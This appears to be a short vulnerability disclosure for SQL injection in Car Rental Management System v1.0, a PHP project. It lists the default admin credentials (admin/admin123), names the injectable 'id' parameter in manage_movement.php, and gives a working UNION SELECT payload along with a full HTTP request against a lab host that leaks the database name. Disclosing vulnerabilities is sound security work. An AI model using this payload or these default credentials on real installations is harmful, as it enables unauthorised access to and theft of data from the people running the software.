# Car Rental Management System v1.0 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.campcodes.com/projects/php/car-rental-management-system/

Vulnerability File: /car-rental-management-system/admin/manage_movement.php?id=

Vulnerability location: /car-rental-management-system/admin/manage_movement.php?id=,id

[+] Payload: /car-rental-management-system/admin/manage_movement.php?id=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,database(),16,17--+ // Leak place ---> id

Current database name: car_rental_db

```sql
GET /car-rental-management-system/admin/manage_movement.php?id=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,database(),16,17--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=q0aiu0hqk51vrl4kivubc7u18k
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170959661-bde43dbc-b3bd-4523-b269-a12c1828278c.png)

![image](https://user-images.githubusercontent.com/54017627/170959511-9d3c7ab2-9689-4ff6-bbfa-f33dcfb69682.png)

